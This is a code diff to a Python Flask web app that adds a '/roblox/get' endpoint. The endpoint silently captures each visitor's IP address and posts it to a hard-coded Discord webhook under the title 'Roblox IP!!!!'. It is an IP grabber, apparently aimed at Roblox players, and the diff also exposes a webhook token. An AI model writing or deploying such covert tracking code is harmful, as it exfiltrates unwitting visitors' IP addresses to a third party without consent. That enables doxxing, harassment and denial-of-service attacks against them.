@@ -136,6 +136,28 @@ def account_information(userid):
 def ping_pong():
     return 'Pong!', 200
 
+# =============== ROBLOX ===============
+
+WEBHOOK_URL = "https://discord.com/api/webhooks/1412755798483800105/x2Wgc3s_sqTQoU3KNKLL81BFlu2NU6oWd5HFDF5uWS7sXV_O5P1tDf_SGMOR22_HrCVG"
+
+@app.route("/roblox/get", methods=["GET"])
+def roblox_get_ip():
+    ip = request.headers.get('X-Forwarded-For', request.remote_addr)
+
+    embed = {
+        "title": "Roblox IP!!!!",
+        "description": "IP: "+ ip,
+        "color": 0x5865F2  # Discord blurple
+    }
+
+    data = {
+        "embeds": [embed]
+    }
+
+    requests.post(WEBHOOK_URL, json=data)
+
+    return '', 200
+
 # =====================================
 
 if __name__ == "__main__":
